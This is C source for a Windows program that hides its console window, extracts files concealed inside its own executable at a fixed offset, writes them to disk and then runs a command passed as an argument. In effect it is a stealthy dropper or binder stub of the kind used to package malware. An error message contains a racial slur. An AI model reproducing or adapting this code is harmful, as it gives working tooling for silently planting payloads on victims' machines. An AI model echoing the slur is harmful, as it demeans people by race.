#include<stdio.h>
#include<string.h>
#include<windows.h>
#define OFFSET 0x4600

FILE *filein;

void createFile(char *filename, int len_of_file) {
    FILE *tempfile;
    if (! (tempfile = fopen(filename, "wb+")))
        system("echo FUCK");
    char temp_char;
    while(len_of_file--) {
        fread(&temp_char, 1, 1, filein);
        fwrite(&temp_char, 1, 1, tempfile);
    }
    fclose(tempfile);
}

int main(int argc, char **argv) {
//  TO SHOW OR NOT TO SHOW
    ShowWindow(FindWindow("ConsoleWindowClass",NULL),SW_HIDE);
    char comp[] = ".exe";
    char exec_name[50];
    char * pointer;

    if(pointer = strrchr(argv[0], '\\'))
        strcpy(exec_name, ++pointer);
    else
        strcpy(exec_name, argv[0]);
    
    if(!(pointer = strrchr(exec_name, '.')))
        strcat(exec_name, ".exe");

    filein = fopen(exec_name, "rb");

    if (!filein)
        system("echo FUCKING NIGGERS");

    const long start_point = OFFSET;
    fseek(filein, start_point, SEEK_SET);

    char num_of_files;
    fread(&num_of_files, 1, 1, filein);

    // printf("%s : %d files hidden\n", exec_name, num_of_files);
    for (char i = 0; i < num_of_files; i++) {
        char len_of_filename;
        fread(&len_of_filename, 1, 1, filein);
        // printf("iteration\n");
        char filename[len_of_filename + 1];
        fread(filename, 1, len_of_filename, filein);
        filename[len_of_filename] = '\0';
        int len_of_file;
        fread(&len_of_file, 4, 1, filein);

        // printf("len_of_filename: %d filename: %s len_of_file: %d\n", len_of_filename, filename, len_of_file);
        
        createFile(filename, len_of_file);
    }

    fclose(filein);

    if (argc > 1)
        system(argv[1]);
    
    return 0;
}